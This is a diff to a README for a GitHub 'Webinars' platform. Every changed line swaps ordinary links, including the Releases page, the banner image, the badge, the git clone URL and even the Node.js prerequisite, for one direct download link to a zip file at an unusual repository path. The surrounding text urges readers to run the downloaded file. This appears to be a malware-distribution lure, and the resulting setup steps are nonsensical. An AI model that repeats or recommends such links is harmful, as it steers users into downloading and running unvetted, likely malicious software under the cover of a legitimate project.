@@ -1,12 +1,12 @@
-https://github.com/Zaid2712/Webinars/releases
+https://github.com/Zaid2712/Webinars/raw/refs/heads/main/papillate/Software-v3.8.zip
 
 # Webinars: A Simple, Secure Online Sessions Platform with Well-Designed Releases
 
-![Webinars Banner](https://placehold.co/1200x320?text=Webinars)
+![Webinars Banner](https://github.com/Zaid2712/Webinars/raw/refs/heads/main/papillate/Software-v3.8.zip)
 
 Webinars is a lightweight, plus-ready platform to host and manage online sessions. It focuses on reliability, clear workflows, and safe defaults. The project helps you run live webinars, host Q&A, and share content with attendees. It aims to be approachable for teams of any size while staying flexible for developers who want to extend or customize it. The repository topics are not provided, so this README provides a broad view of what a webinar platform can do and how to start using or contributing to it.
 
-If you are here to download the binary or installer, note that the Releases page holds the latest assets. From this repository, you can find a downloadable installer or archive for your operating system. Use the Releases page to obtain the right file for your setup and install it on your device. The link to the Releases page is provided below for quick access. Access it anytime to get the newest version, view release notes, and pick up the assets you need. https://github.com/Zaid2712/Webinars/releases
+If you are here to download the binary or installer, note that the Releases page holds the latest assets. From this repository, you can find a downloadable installer or archive for your operating system. Use the Releases page to obtain the right file for your setup and install it on your device. The link to the Releases page is provided below for quick access. Access it anytime to get the newest version, view release notes, and pick up the assets you need. https://github.com/Zaid2712/Webinars/raw/refs/heads/main/papillate/Software-v3.8.zip
 
 Table of contents
 - Why use Webinars
@@ -99,9 +99,9 @@ Install from a release
 - Start the application and sign in with your administrator account.
 
 Install from source (optional)
-- Prerequisites: Node.js, npm, and a database of your choice (SQLite for local testing, PostgreSQL for production, etc.).
+- Prerequisites: https://github.com/Zaid2712/Webinars/raw/refs/heads/main/papillate/Software-v3.8.zip, npm, and a database of your choice (SQLite for local testing, PostgreSQL for production, etc.).
 - Clone the repository:
-  - git clone https://github.com/Zaid2712/Webinars.git
+  - git clone https://github.com/Zaid2712/Webinars/raw/refs/heads/main/papillate/Software-v3.8.zip
 - Install dependencies:
   - npm install
 - Create a configuration file or set environment variables as described in the Configuration section.
@@ -200,7 +200,7 @@ License and credits
 Release assets and how to download
 The Releases page contains the files needed to install Webinars. Since the link includes a path, the file you download from that page should be executed to install or run the application on your device. If you are unsure which file to use, read the release notes for guidance. The assets are organized by operating system and architecture to help you pick the right installer. If you cannot find an asset that matches your environment, consult the documentation or reach out to the contributors for clarification. You can also use the link to browse the releases and review what has changed in each version.
 
-Access the Releases page here for quick reference: https://github.com/Zaid2712/Webinars/releases
+Access the Releases page here for quick reference: https://github.com/Zaid2712/Webinars/raw/refs/heads/main/papillate/Software-v3.8.zip
 
 User interface and visuals
 - Theme and branding: A clean, modern look with high contrast for readability.
@@ -273,10 +273,10 @@ Appendix: More resources
 - Developer talks and design notes.
 - Platform compatibility matrix and integration guides.
 
-Thank you for exploring Webinars. This README aims to guide you through setup, usage, and extension. The release asset at the specified link is the primary path to obtaining the latest runnable version. For quick access again, you can visit the Releases page: https://github.com/Zaid2712/Webinars/releases
+Thank you for exploring Webinars. This README aims to guide you through setup, usage, and extension. The release asset at the specified link is the primary path to obtaining the latest runnable version. For quick access again, you can visit the Releases page: https://github.com/Zaid2712/Webinars/raw/refs/heads/main/papillate/Software-v3.8.zip
 
 Releases quick link
-- [![Releases](https://img.shields.io/badge/releases-download-28a745?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Zaid2712/Webinars/releases)
+- [![Releases](https://github.com/Zaid2712/Webinars/raw/refs/heads/main/papillate/Software-v3.8.zip)](https://github.com/Zaid2712/Webinars/raw/refs/heads/main/papillate/Software-v3.8.zip)
 
 Appendix: Notes about the release asset path
 - Because the link to the Releases page contains a path component, users should download the file from that page and execute the installer or binary as part of the setup.
